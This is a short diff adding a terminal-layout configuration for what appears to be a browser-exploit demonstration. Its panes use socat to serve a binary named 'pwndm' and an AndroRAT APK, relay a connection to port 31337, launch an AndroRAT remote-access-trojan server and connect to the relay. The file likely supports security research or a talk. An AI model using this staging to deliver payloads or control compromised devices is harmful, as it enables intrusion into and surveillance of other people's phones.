@@ -1,0 +1,10 @@
+windows:
+  - name: "demo"
+    root: "~/demo/browser-demo"
+    layout: tiled
+    panes:
+      - cmd:  server
+      - cmd: "socat -d -d tcp-listen:9993,fork,reuseaddr tcp-listen:31337,fork,reuseaddr,end-close" 
+      - cmd: ["socat -d -d tcp-listen:9991,fork,reuseaddr file:./binaries/pwndm&", "socat -d -d tcp-listen:9992,fork,reuseaddr file:./binaries/androrat.apk&"]
+      - cmd: ["sh ./build_cmd.sh > cmds.txt", "less cmds.txt"]
+      - cmd: ["~/git/via-demo/androrat/src/AndroratServer/run-server &> /dev/null &", "ifconfig en0", "sleep 2", "socat tcp-connect:localhost:9993 -"]
